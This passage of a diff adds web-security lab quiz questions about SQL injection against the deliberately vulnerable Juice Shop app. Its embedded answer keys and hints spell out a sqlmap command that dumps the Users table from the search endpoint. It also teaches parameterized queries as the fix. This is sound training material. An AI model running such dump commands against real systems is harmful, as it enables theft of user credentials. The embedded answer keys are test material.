+            Q5: A developer asks how to kill this bug for good. Best answer?
+          </div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Blocking the word 'OR' is a filter, and filters get bypassed (that's the DVWA High level). It's a speed bump, not a fix.">A) Block the word "OR" in inputs.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Correct. Parameterized queries / prepared statements keep input as data, so a quote can never become code. That's the root-cause fix.">B) Use parameterized queries so input is always treated as data.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Hiding the error slows an attacker down but the injection still works blind. sqlmap won't even blink.">C) Just hide the error messages.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <!-- Q6 Terminal challenge: sqlmap dump -->
+        <div class="quiz-card" data-question-id="lab03-q6"
+             data-expected-regex="sqlmap\s+-u\s+.*products/search.*(-T\s+Users.*--dump|--dump.*-T\s+Users)"
+             data-solution-rationale="sqlmap detects the injection on the q parameter, then -T Users --dump pulls that table. You did the same thing by hand in DO #4."
+             data-hint="Call sqlmap with -u pointing at the search URL (quote it), then target the Users table with -T Users and --dump.">
+          <div class="quiz-question">
+            Q6 [Terminal]: Write a <code>sqlmap</code> command that targets the Juice Shop search URL and dumps the <code>Users</code> table.
+          </div>
+          <div class="quiz-input-group">
+            <input type="text" class="quiz-input" placeholder='root@kali:~# sqlmap -u "http://localhost:3000/rest/products/search?q=apple" ...' spellcheck="false" autocomplete="off" />
+            <button type="button" class="quiz-submit-btn">Execute</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <!-- Q7 Spot the injection point -->
+        <div class="quiz-card" data-question-id="lab03-q7">
+          <div class="quiz-question">
+            Q7 [Spot it]: Four inputs reach the backend. Which one is the classic first place you'd test for SQL injection?
+          </div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="A static image path usually isn't touching the database. Low priority.">A) <code>GET /assets/logo.png</code></button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Correct. A search box feeds your text straight into a WHERE ... LIKE query. It's the textbook injection point, and it's exactly where you broke Juice Shop today.">B) <code>GET /rest/products/search?q=apple</code></button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="A health check normally returns a fixed string with no DB query behind it.">C) <code>GET /health</code></button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="It can be worth checking, but a static footer link isn't the first thing you'd probe.">D) <code>GET /about</code></button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+      </section>
+    </main>
+
+  </div>
+
+  <div data-site-footer></div>
+
+  <script data-site-root=".." src="../assets/js/site.js"></script>
+  <script src="../assets/js/vendor/qrcode.js"></script>
+  <script src="../assets/js/lab-common.js"></script>
+  <script src="../assets/js/quiz.js"></script>
+</body>
+</html>
